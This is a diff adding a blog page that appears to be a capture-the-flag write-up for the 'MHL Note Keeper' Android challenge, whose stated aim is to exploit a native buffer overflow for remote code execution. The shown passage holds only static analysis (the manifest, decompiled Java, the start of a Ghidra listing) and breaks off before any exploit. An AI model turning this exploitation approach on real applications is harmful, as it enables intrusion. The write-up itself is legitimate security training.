@@ -1,0 +1,1222 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>MHL Note Keeper | KS Blog</title>
+<meta name="keywords" content="MHL, Android CTF">
+<meta name="description" content="Challenge Description
+
+Welcome to the NoteKeeper Application, where users can create and encode short notes. However, lurking within the app is a critical buffer overflow vulnerability. Your mission is to uncover this vulnerability and exploit it to achieve remote code execution.
+notekeeper.apk
+
+Solution
+I started out by performing static analysis to look into the code
+Static Analysis
+I started out by looking into the AndroidManifest.xml.
+
+
+1
+2
+3
+4
+5
+6
+7
+8
+
+
+&lt;activity
+    android:name=&#34;com.mobilehackinglab.notekeeper.MainActivity&#34;
+    android:exported=&#34;true&#34;&gt;
+    &lt;intent-filter&gt;
+        &lt;action android:name=&#34;android.intent.action.MAIN&#34;/&gt;
+        &lt;category android:name=&#34;android.intent.category.LAUNCHER&#34;/&gt;
+    &lt;/intent-filter&gt;
+&lt;/activity&gt;
+
+
+There&rsquo;s only one activity at the moment so lets look into it.">
+<meta name="author" content="">
+<link rel="canonical" href="https://callmeks.github.io/posts/mhl-note-keeper/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" integrity="sha256-1yREUm1&#43;y9sAFUOKf6iQVKZYv3WdBULi5d&#43;BzpS0k&#43;4=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b">
+<link rel="icon" type="image/png" sizes="16x16" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b?size=16">
+<link rel="icon" type="image/png" sizes="32x32" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b?size=32">
+<link rel="apple-touch-icon" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b">
+<link rel="mask-icon" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://callmeks.github.io/posts/mhl-note-keeper/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://callmeks.github.io/posts/mhl-note-keeper/">
+  <meta property="og:site_name" content="KS Blog">
+  <meta property="og:title" content="MHL Note Keeper">
+  <meta property="og:description" content="Challenge Description Welcome to the NoteKeeper Application, where users can create and encode short notes. However, lurking within the app is a critical buffer overflow vulnerability. Your mission is to uncover this vulnerability and exploit it to achieve remote code execution.
+notekeeper.apk
+Solution I started out by performing static analysis to look into the code
+Static Analysis I started out by looking into the AndroidManifest.xml.
+1 2 3 4 5 6 7 8 &lt;activity android:name=&#34;com.mobilehackinglab.notekeeper.MainActivity&#34; android:exported=&#34;true&#34;&gt; &lt;intent-filter&gt; &lt;action android:name=&#34;android.intent.action.MAIN&#34;/&gt; &lt;category android:name=&#34;android.intent.category.LAUNCHER&#34;/&gt; &lt;/intent-filter&gt; &lt;/activity&gt; There’s only one activity at the moment so lets look into it.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-04-08T23:00:57+08:00">
+    <meta property="article:modified_time" content="2025-04-08T23:00:57+08:00">
+    <meta property="article:tag" content="MHL">
+    <meta property="article:tag" content="Android CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="MHL Note Keeper">
+<meta name="twitter:description" content="Challenge Description
+
+Welcome to the NoteKeeper Application, where users can create and encode short notes. However, lurking within the app is a critical buffer overflow vulnerability. Your mission is to uncover this vulnerability and exploit it to achieve remote code execution.
+notekeeper.apk
+
+Solution
+I started out by performing static analysis to look into the code
+Static Analysis
+I started out by looking into the AndroidManifest.xml.
+
+
+1
+2
+3
+4
+5
+6
+7
+8
+
+
+&lt;activity
+    android:name=&#34;com.mobilehackinglab.notekeeper.MainActivity&#34;
+    android:exported=&#34;true&#34;&gt;
+    &lt;intent-filter&gt;
+        &lt;action android:name=&#34;android.intent.action.MAIN&#34;/&gt;
+        &lt;category android:name=&#34;android.intent.category.LAUNCHER&#34;/&gt;
+    &lt;/intent-filter&gt;
+&lt;/activity&gt;
+
+
+There&rsquo;s only one activity at the moment so lets look into it.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://callmeks.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "MHL Note Keeper",
+      "item": "https://callmeks.github.io/posts/mhl-note-keeper/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "MHL Note Keeper",
+  "name": "MHL Note Keeper",
+  "description": "Challenge Description Welcome to the NoteKeeper Application, where users can create and encode short notes. However, lurking within the app is a critical buffer overflow vulnerability. Your mission is to uncover this vulnerability and exploit it to achieve remote code execution.\nnotekeeper.apk\nSolution I started out by performing static analysis to look into the code\nStatic Analysis I started out by looking into the AndroidManifest.xml.\n1 2 3 4 5 6 7 8 \u0026lt;activity android:name=\u0026#34;com.mobilehackinglab.notekeeper.MainActivity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; There\u0026rsquo;s only one activity at the moment so lets look into it.\n",
+  "keywords": [
+    "MHL", "Android CTF"
+  ],
+  "articleBody": "Challenge Description Welcome to the NoteKeeper Application, where users can create and encode short notes. However, lurking within the app is a critical buffer overflow vulnerability. Your mission is to uncover this vulnerability and exploit it to achieve remote code execution.\nnotekeeper.apk\nSolution I started out by performing static analysis to look into the code\nStatic Analysis I started out by looking into the AndroidManifest.xml.\n1 2 3 4 5 6 7 8 ",
+  "wordCount" : "2323",
+  "inLanguage": "en",
+  "datePublished": "2025-04-08T23:00:57+08:00",
+  "dateModified": "2025-04-08T23:00:57+08:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://callmeks.github.io/posts/mhl-note-keeper/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "KS Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://callmeks.github.io/" accesskey="h" title="KS Blog (Alt + H)">KS Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://callmeks.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://callmeks.github.io/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://callmeks.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://callmeks.github.io/archives/" title="Archives">
+                    <span>Archives</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://callmeks.github.io/about/" title="Whoami">
+                    <span>Whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://callmeks.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://callmeks.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      MHL Note Keeper
+    </h1>
+    <div class="post-meta"><span title='2025-04-08 23:00:57 +0800 +08'>April 8, 2025</span>&nbsp;·&nbsp;11 min&nbsp;·&nbsp;2323 words
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-description">Challenge Description</a></li>
+    <li><a href="#solution">Solution</a>
+      <ul>
+        <li><a href="#static-analysis">Static Analysis</a></li>
+        <li><a href="#dynamic-analysis">Dynamic Analysis</a></li>
+      </ul>
+    </li>
+    <li><a href="#things-i-learned-from-this-challenge">Things I learned from this challenge</a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-description">Challenge Description<a hidden class="anchor" aria-hidden="true" href="#challenge-description">#</a></h2>
+<blockquote>
+<p>Welcome to the NoteKeeper Application, where users can create and encode short notes. However, lurking within the app is a critical buffer overflow vulnerability. Your mission is to uncover this vulnerability and exploit it to achieve remote code execution.</p>
+<p><a href="static/notekeeper.apk">notekeeper.apk</a></p>
+</blockquote>
+<h2 id="solution">Solution<a hidden class="anchor" aria-hidden="true" href="#solution">#</a></h2>
+<p>I started out by performing static analysis to look into the code</p>
+<h3 id="static-analysis">Static Analysis<a hidden class="anchor" aria-hidden="true" href="#static-analysis">#</a></h3>
+<p>I started out by looking into the <code>AndroidManifest.xml</code>.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-1">1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-2">2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-3">3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-4">4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-5">5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-6">6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-7">7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-8">8</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;activity</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;com.mobilehackinglab.notekeeper.MainActivity&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">android:exported=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;intent-filter&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;action</span> <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;android.intent.action.MAIN&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;category</span> <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;android.intent.category.LAUNCHER&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/intent-filter&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/activity&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There&rsquo;s only one activity at the moment so lets look into it.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-1"> 1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-2"> 2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-3"> 3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-4"> 4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-5"> 5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-6"> 6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-7"> 7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-8"> 8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-9"> 9</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-10">10</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-11">11</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-12">12</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-13">13</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-14">14</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-15">15</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-16">16</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-17"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-17">17</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-18"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-18">18</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-19"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-19">19</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-20"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-20">20</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-21"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-21">21</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-22"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-22">22</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-23"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-23">23</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-24"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-24">24</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-25"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-25">25</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-26"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-26">26</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-27"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-27">27</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-28"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-28">28</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-29"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-29">29</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-30"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-30">30</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-31"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-31">31</a>
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">native</span> String <span style="color:#a6e22e">parse</span>(String Title);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">showDialogue$lambda$1</span>(EditText $ed_title, EditText $ed_content, MainActivity <span style="color:#66d9ef">this</span>$0, Dialog dialog, View it) {
+</span></span><span style="display:flex;"><span>    Intrinsics.<span style="color:#a6e22e">checkNotNullParameter</span>(<span style="color:#66d9ef">this</span>$0, <span style="color:#e6db74">&#34;this$0&#34;</span>);
+</span></span><span style="display:flex;"><span>    Intrinsics.<span style="color:#a6e22e">checkNotNullParameter</span>(dialog, <span style="color:#e6db74">&#34;$dialog&#34;</span>);
+</span></span><span style="display:flex;"><span>    String title_ <span style="color:#f92672">=</span> $ed_title.<span style="color:#a6e22e">getText</span>().<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>    String note_con <span style="color:#f92672">=</span> $ed_content.<span style="color:#a6e22e">getText</span>().<span style="color:#a6e22e">toString</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (title_.<span style="color:#a6e22e">length</span>() <span style="color:#f92672">&gt;</span> 0) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (note_con.<span style="color:#a6e22e">length</span>() <span style="color:#f92672">&gt;</span> 0) {
+</span></span><span style="display:flex;"><span>            String cap_title <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>$0.<span style="color:#a6e22e">parse</span>(title_);
+</span></span><span style="display:flex;"><span>            note_data dataElement <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> note_data(cap_title, note_con, <span style="color:#e6db74">&#34;Number of characters : &#34;</span> <span style="color:#f92672">+</span> note_con.<span style="color:#a6e22e">length</span>());
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>$0.<span style="color:#a6e22e">notes</span>.<span style="color:#a6e22e">add</span>(dataElement);
+</span></span><span style="display:flex;"><span>            Note_Adapter note_Adapter <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>$0.<span style="color:#a6e22e">notes_adp</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (note_Adapter <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>                Intrinsics.<span style="color:#a6e22e">throwUninitializedPropertyAccessException</span>(<span style="color:#e6db74">&#34;notes_adp&#34;</span>);
+</span></span><span style="display:flex;"><span>                note_Adapter <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            note_Adapter.<span style="color:#a6e22e">notifyDataSetChanged</span>();
+</span></span><span style="display:flex;"><span>            dialog.<span style="color:#a6e22e">dismiss</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    Toast.<span style="color:#a6e22e">makeText</span>(<span style="color:#66d9ef">this</span>$0, <span style="color:#e6db74">&#34;Don&#39;t leave the title or note field empty&#34;</span>, 0).<span style="color:#a6e22e">show</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> {
+</span></span><span style="display:flex;"><span>    System.<span style="color:#a6e22e">loadLibrary</span>(<span style="color:#e6db74">&#34;notekeeper&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After reading some code, I noticed that this application need to load a shared library and it has a native function <code>parse</code>. Aside from that, the <code>showDialogue$lambda$1</code> is the function where it will trigger the native function <code>parse</code>. I then proceed to read the shared library by using <code>ghidra</code>.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-1"> 1</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-2"> 2</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-3"> 3</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-4"> 4</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-5"> 5</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-6"> 6</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-7"> 7</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-8"> 8</a>
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-9"> 9</a>
